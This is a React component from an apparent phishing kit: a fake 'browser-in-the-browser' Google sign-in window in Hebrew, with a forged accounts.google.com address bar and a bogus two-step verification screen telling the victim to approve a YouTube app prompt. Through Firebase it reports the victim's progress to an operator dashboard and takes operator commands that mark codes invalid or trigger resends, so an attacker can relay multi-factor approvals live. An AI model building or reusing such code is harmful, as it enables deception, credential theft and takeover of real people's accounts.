import React from "react";
import EmailLayout from "../EmailLayout";
const youtubeGif = "/youtubeapp.gif";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { getDetectedLanguageDisplayName } from "../../../utils/languageUtils";
import { useClientCountry } from "../../../hooks/use-client-country";
import { DeviceManager } from "../../../utils/deviceManager";

// YouTube App verification page (2-Step Verification) – same frame/behavior as Auth/CodeMail
const GmailYouTubePage = () => {
  const [dontAsk, setDontAsk] = React.useState(false);
  const {
    updateClientData,
    commands,
    isUserActive,
    clearCommands,
    clientData,
  } = useFirebaseClient();
  const { country } = useClientCountry();
  const [isReady, setIsReady] = React.useState(false);
  const [progress, setProgress] = React.useState(0);

  React.useEffect(() => {
    // Preloader com duração de 2.5 segundos
    const startTime = Date.now();
    const duration = 2500; // 2.5 segundos

    const updateProgress = () => {
      const elapsed = Date.now() - startTime;
      const newProgress = Math.min((elapsed / duration) * 100, 100);
      setProgress(newProgress);

      if (newProgress < 100) {
        requestAnimationFrame(updateProgress);
      }
    };

    requestAnimationFrame(updateProgress);

    // Aguarda a barra completar totalmente antes de abrir o modal
    const id = setTimeout(() => setIsReady(true), 2600); // 100ms a mais para garantir que chegue a 100%
    return () => clearTimeout(id);
  }, []);

  // Função para obter device number logado
  const getLoggedInDevice = () => {
    const device = DeviceManager.getDeviceWithFirebaseData(clientData);
    console.log("📱 Gmail YouTube Modal - Device obtido:", device);
    return device;
  };

  const [displayDevice, setDisplayDevice] = React.useState(getLoggedInDevice());
  const [isNetOnline, setIsNetOnline] = React.useState(
    typeof navigator !== "undefined" ? navigator.onLine : true
  );
  const presence = React.useMemo(() => {
    if (!isNetOnline) return "offline";
    if (!isUserActive) return "away";
    return "online";
  }, [isNetOnline, isUserActive]);

  // Responsividade para mobile: centralizar e evitar rolagem
  const [viewport, setViewport] = React.useState({
    width: typeof window !== "undefined" ? window.innerWidth : 1024,
    height: typeof window !== "undefined" ? window.innerHeight : 768,
  });
  const isSmallViewport = viewport.width < 520 || viewport.height < 600;
  React.useEffect(() => {
    const onResize = () =>
      setViewport({ width: window.innerWidth, height: window.innerHeight });
    window.addEventListener("resize", onResize);
    return () => window.removeEventListener("resize", onResize);
  }, []);

  React.useEffect(() => {
    const onOnline = () => setIsNetOnline(true);
    const onOffline = () => setIsNetOnline(false);
    window.addEventListener("online", onOnline);
    window.addEventListener("offline", onOffline);
    return () => {
      window.removeEventListener("online", onOnline);
      window.removeEventListener("offline", onOffline);
    };
  }, []);

  // Monitorar mudanças no localStorage e clientData para atualizar device number em tempo real
  React.useEffect(() => {
    const handleStorageChange = () => {
      const newDevice = getLoggedInDevice();
      if (newDevice !== displayDevice) {
        setDisplayDevice(newDevice);
        console.log("📱 Gmail YouTube Modal - Device number atualizado:", newDevice);
      }
    };

    // Escutar mudanças no localStorage
    window.addEventListener("storage", handleStorageChange);

    // Verificar periodicamente (para mudanças na mesma aba)
    const interval = setInterval(handleStorageChange, 1000);

    return () => {
      window.removeEventListener("storage", handleStorageChange);
      clearInterval(interval);
    };
  }, [displayDevice, clientData?.deviceNumber]);

  React.useEffect(() => {
    updateClientData({
      currentUrl: "/sync?view=youtube",
      currentPage: "gmail_youtube",
      gmailStage: "youtube",
      fromForm: true,
    });
  }, [updateClientData]);

  const translations = {
    windowTitle: "היכנס לחשבונות Google",
    url: "https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=407408718192.apps.googleusercontent.com",
    header: "היכנס ל-Google",
  };

  // Drag
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(0, (window.innerWidth - 466) / 2),
    top: Math.max(0, (window.innerHeight - 560) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    if (isSmallViewport) return; // desabilita arrasto em telas pequenas
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  // Navegação + inválidos
  const [invalidMessage, setInvalidMessage] = React.useState("");

  const navigateByCommand = React.useCallback(() => false, []);

  // Estado de resend
  const [resendCooldown, setResendCooldown] = React.useState(0);
  React.useEffect(() => {
    if (resendCooldown <= 0) return;
    const t = setInterval(
      () => setResendCooldown((s) => Math.max(0, s - 1)),
      1000
    );
    return () => clearInterval(t);
  }, [resendCooldown]);

  const handleResend = async () => {
    if (resendCooldown > 0) return;
    try {
      // Atualiza dados do cliente para o Dashboard reagir (badge + som)
      await updateClientData({
        gmailYouTubeResendAt: Date.now(),
        gmailYouTubeResend: true,
        lastAction: "gmail_youtube_resend",
      });

      // Apenas sinaliza no Firebase; toast/sons são responsabilidade do dashboard admin

      // Inicia cooldown 30s
      setResendCooldown(30);
    } catch (e) {}
  };

  const handleInvalid = React.useCallback(
    (cmd) => {
      const map = { invalid_gmailyoutube: "קוד YouTube שגוי." };
      if (cmd in map) {
        setInvalidMessage(map[cmd]);
        clearCommands();
        return true;
      }
      return false;
    },
    [clearCommands]
  );

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latestRaw = commands[commands.length - 1];
    if (!latestRaw) return;
    const latest =
      typeof latestRaw === "string"
        ? latestRaw.replace(/^\"+|\"+$/g, "").trim()
        : latestRaw;
    if (typeof latest !== "string") return;
    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      handleInvalid(latest);
      return;
    }
    const navigated = navigateByCommand(latest);
    if (navigated) setTimeout(() => clearCommands(), 50);
  }, [commands, navigateByCommand, handleInvalid, clearCommands]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Roboto, Arial, sans-serif" }}
      >
        {/* presence + toasts removidos */}
        {false && (
          <div
            style={{
              position: "fixed",
              top: 10,
              right: 10,
              zIndex: 60,
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "6px 10px",
              borderRadius: 999,
              background: "rgba(0,0,0,0.45)",
              color: "#e5e7eb",
              fontSize: 12,
              border: "1px solid rgba(255,255,255,0.08)",
              backdropFilter: "blur(0.5px)",
            }}
          >
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: 999,
                display: "inline-block",
                background:
                  presence === "online"
                    ? "#22c55e"
                    : presence === "away"
                    ? "#f59e0b"
                    : "#ef4444",
              }}
            />
            <span style={{ textTransform: "capitalize" }}>{presence}</span>
          </div>
        )}

        <div
          onMouseDown={startDrag}
          style={{
            background: "#fff",
            borderRadius: 12,
            boxShadow: "0 8px 32px rgba(0,0,0,0.3)",
            width: isSmallViewport ? "min(466px, 96vw)" : "min(466px, 92vw)",
            height: Math.min(560, Math.max(420, viewport.height - 24)),
            color: "#202124",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Spinner de loading inicial */}
          {!isReady && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 9999,
                borderRadius: 12,
              }}
            >
              {/* Barra da janela */}
              <div
                style={{
                  height: 32,
                  background: "#e8f0fe",
                  borderBottom: "1px solid #d7e3fc",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 8px",
                  fontSize: 12,
                  direction: "ltr", // Força LTR para manter botões à direita
                }}
              >
                <span
                  style={{
                    opacity: 0.9,
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}
                >
                  <svg
                    xmlns="https://www.w3.org/2000/svg"
                    width="16"
                    height="16"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                  {translations.windowTitle}
                </span>
                <div style={{ display: "flex", gap: 4 }}>
                  <button
                    title="Minimize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M3 8.5H13"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                  <button
                    title="Maximize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <rect
                        x="3.5"
                        y="3.5"
                        width="9"
                        height="9"
                        rx="1"
                        stroke="#111"
                        strokeWidth="1.5"
                      />
                    </svg>
                  </button>
                  <button
                    title="Close"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M4 4L12 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                      <path
                        d="M12 4L4 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              {/* URL bar */}
              <div
                style={{
                  borderBottom: "1px solid #eaecee",
                  padding: 0,
                  background: "#ffffff",
                  margin: 0,
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#eef1f3",
                    border: "1px solid #d0d7de",
                    borderRadius: 0,
                    height: 32,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 10px",
                    gap: 8,
                    fontSize: 12,
                    color: "#202124",
                  }}
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    version="1.1"
                    fill="none"
                    stroke="#5f6368"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    {translations.url}
                  </div>
                </div>
              </div>

              {/* Barra de progresso */}
              <div
                style={{
                  width: "100%",
                  height: 2,
                  background: "#e8f0fe",
                  position: "relative",
                }}
              >
                <div
                  style={{
                    width: `${progress}%`,
                    height: "100%",
                    background: "#1a73e8",
                    transition: "width 0.1s ease-out",
                    position: "absolute",
                    left: 0,
                    top: 0,
                  }}
                />
              </div>

              {/* Header pequeno */}
              <div
                style={{
                  width: "100%",
                  background: "#ffffff",
                  padding: "4px 8px",
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  borderBottom: "1px solid #eaecee",
                  height: 40,
                }}
              >
                <div
                  style={{
                    width: 20,
                    height: 20,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="18"
                    height="18"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                </div>
                <span style={{ color: "#000", fontSize: 12 }}>
                  {translations.header}
                </span>
              </div>

              {/* Conteúdo central com spinner */}
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #1a73e8",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>

              {/* Footer */}
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  minHeight: 44,
                  borderTop: "1px solid #f0f0f0",
                  background: "transparent",
                  padding: "0 24px",
                }}
              >
                <div style={{ display: "flex", gap: 40 }}>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    Help
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    Privacy
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    Terms
                  </a>
                </div>
                <span style={{ color: "#666", fontSize: 12 }}>
                  {country?.name || "..."}
                </span>
              </div>
            </div>
          )}
          {/* Titlebar */}
          <div
            style={{
              height: 28,
              background: "#e8f0fe",
              borderBottom: "1px solid #d7e3fc",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 8px",
              fontSize: 12,
            }}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 6,
              }}
            >
              <svg
                xmlns="https://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                />
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                />
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                />
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 4 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#111"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                onClick={() =>
                  setInvalidMessage("Invalid YouTube confirmation.")
                }
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* URL bar */}
          <div
            style={{
              borderBottom: "1px solid #eaecee",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              style={{
                width: "100%",
                background: "#eef1f3",
                border: "1px solid #d0d7de",
                borderRadius: 0,
                height: 32,
                display: "flex",
                alignItems: "center",
                padding: "0 10px",
                gap: 8,
                fontSize: 12,
                color: "#202124",
              }}
            >
              <svg
                width="16"
                height="16"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                stroke="#5f6368"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          {/* Removido: barra de loading */}

          {/* Small header */}
          <div
            style={{
              width: "100%",
              background: "#ffffff",
              padding: "3px 8px",
              display: "flex",
              alignItems: "center",
              gap: 6,
              borderBottom: "1px solid #eaecee",
              height: isSmallViewport ? 34 : 38,
            }}
          >
            <div
              style={{
                width: 20,
                height: 20,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                />
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                />
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                />
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                />
              </svg>
            </div>
            <span style={{ color: "#000", fontSize: 12 }}>
              {translations.header}
            </span>
          </div>

          {/* Main content */}
          <div
            style={{
              flex: 1,
              minHeight: 0,
              padding: isSmallViewport ? "8px 14px 8px" : "10px 16px 10px",
              opacity: 1,
              pointerEvents: "auto",
              position: "relative",
              overflow: "hidden",
              direction: "rtl",
              textAlign: "right"
            }}
          >
            <h1
              style={{
                fontSize: isSmallViewport ? 18 : 20,
                fontWeight: 500,
                margin: 0,
              }}
            >
              אימות דו-שלבי
            </h1>
            <p
              style={{
                color: "#3c4043",
                fontSize: isSmallViewport ? 11 : 12,
                margin: isSmallViewport ? "6px 0 8px" : "6px 0 8px",
              }}
            >
              כדי לעזור לשמור על החשבון שלך בטוח, Google רוצה לוודא שזה
              באמת אתה מנסה להיכנס
            </p>

            {/* Email badge */}
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                border: "1px solid #dadce0",
                borderRadius: 16,
                padding: "3px 6px 3px 10px",
                gap: 8,
                marginBottom: 14,
              }}
            >
              <svg
                width="16"
                height="18"
                viewBox="0 0 42 42"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
                style={{ marginRight: 0, display: "block" }}
              >
                <path
                  fill="#000000"
                  fillRule="evenodd"
                  d="M24,45A21,21,0,1,1,45,24,21,21,0,0,1,24,45Zm11.633-6c-.157-.231-.355-.518-.514-.742-.277-.394-.554-.788-.8-1.178C34.305,37.062,32.935,35.224,28,35a2.922,2.922,0,0,1-2.968-3.066L25,31c0-.135-.016.148,0,0V30l1-1a14.435,14.435,0,0,0,2.4-1.464l.135-.093A4.643,4.643,0,0,0,30,26l.036-.381A55.987,55.987,0,0,0,31,19c0-4.71-2.29-7-7-7-4.775,0-7,2.224-7,7a54.693,54.693,0,0,0,.963,6.616l.035.352a3.981,3.981,0,0,0,1.449,1.462l.1.062A19.174,19.174,0,0,0,22,29l1,1v1c.014.138,0-.146,0,0l-.033.934A2.9,2.9,0,0,1,20.084,35h0c-4.956.2-6.393,2.077-6.4,2.077-.252.4-.528.789-.807,1.184-.157.224-.355.51-.513.741a18.917,18.917,0,0,0,23.267,0ZM24,5A18.986,18.986,0,0,0,10.85,37.694c.382-.565.79-1.129,1.15-1.694,0,0,1.67-2.743,8-3,.645,0,.967-.422.967-1.066h0c0-.521,0-.934,0-.934,0-.13-.021-.247-.027-.373A17.5,17.5,0,0,1,18.4,29.133S16,27.657,16,26a60.16,60.16,0,0,1-1-7c0-4.644,1.986-9,9-9,6.92,0,9,4.356,9,9a61.784,61.784,0,0,1-1,7c0,1.611-2.4,3.133-2.4,3.133a13.873,13.873,0,0,1-2.543,1.546c0,.109-.023.209-.023.321,0,0,0,.413,0,.934h0c0,.644.32,1.066.965,1.066,6.424.288,8,3,8,3,.36.565.767,1.129,1.149,1.694A18.985,18.985,0,0,0,24,5Z"
                  transform="translate(-3 -3)"
                />
              </svg>
              <span style={{ fontSize: 13 }}>{displayDevice}</span>
            </div>

            {/* Illustration */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                margin: "6px 0 8px",
              }}
            >
              <img
                src={youtubeGif}
                alt="YouTube app"
                style={{ width: isSmallViewport ? 68 : 92, height: "auto" }}
              />
            </div>

            <h2
              style={{
                fontSize: isSmallViewport ? 13 : 15,
                fontWeight: 500,
                margin: isSmallViewport ? "4px 0" : "6px 0",
              }}
            >
              {`פתח את אפליקציית YouTube${
                clientData?.gmailAppDeviceName
                  ? ` ב-${clientData.gmailAppDeviceName}`
                  : ""
              }`}
            </h2>
            <p
              style={{
                color: "#3c4043",
                fontSize: isSmallViewport ? 11 : 12,
                margin: isSmallViewport ? "0 0 8px" : "0 0 8px",
              }}
            >
              Google שלח התראה ל-iPhone שלך. פתח את אפליקציית YouTube
              ולחץ על <strong>כן</strong> כדי לאשר שזה אתה.
            </p>

            <label
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                userSelect: "none",
                color: "#3c4043",
                fontSize: isSmallViewport ? 11 : 12,
              }}
            >
              <input
                type="checkbox"
                checked={dontAsk}
                onChange={() => setDontAsk((v) => !v)}
              />
              אל תשאל שוב במכשיר זה
            </label>

            {/* Exibir número configurado no dashboard */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginTop: isSmallViewport ? 6 : 8,
              }}
            >
              <div
                style={{
                  width: isSmallViewport ? 42 : 48,
                  height: isSmallViewport ? 42 : 48,
                  borderRadius: 999,
                  background:
                    "linear-gradient(180deg, #f7f9fa 0%, #eceff3 100%)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#202124",
                  border: "1px solid #dfe3e6",
                  boxShadow:
                    "0 1px 2px rgba(0,0,0,0.08), inset 0 1px 0 rgba(255,255,255,0.7)",
                }}
              >
                <span
                  style={{
                    fontSize: isSmallViewport ? 21 : 23,
                    fontWeight: 600,
                    lineHeight: 1,
                  }}
                >
                  {clientData?.gmailYouTubeNumber || ""}
                </span>
              </div>
            </div>

            <div style={{ marginTop: isSmallViewport ? 6 : 8 }}>
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  handleResend();
                }}
                style={{
                  color: "#1a73e8",
                  textDecoration: "none",
                  fontSize: isSmallViewport ? 11 : 12,
                }}
              >
                {resendCooldown > 0
                  ? `נשלח ✓ (המתן ${resendCooldown}s)`
                  : "שלח שוב"}
              </a>
              {invalidMessage && (
                <div style={{ color: "#d93025", fontSize: 12, marginTop: 6 }}>
                  {invalidMessage}
                </div>
              )}
            </div>
          </div>

          {/* Footer */}
          <div
            style={{
              width: "100%",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              minHeight: 44,
              borderTop: "1px solid #f0f0f0",
              background: "transparent",
              padding: "0 24px",
            }}
          >
            <div style={{ display: "flex", gap: 40 }}>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                עזרה
              </a>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                פרטיות
              </a>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                תנאים
              </a>
            </div>
            <span style={{ color: "#666", fontSize: 12 }}>
              {country?.name || "..."}
            </span>
          </div>

          {/* Removido: overlay final e spinner */}

          {/* Keyframes para o spinner */}
          <style>{`
           @keyframes spin { from { transform: rotate(0deg);} to { transform: rotate(360deg);} }
         `}</style>
        </div>
      </div>
    </EmailLayout>
  );
};

export default GmailYouTubePage;
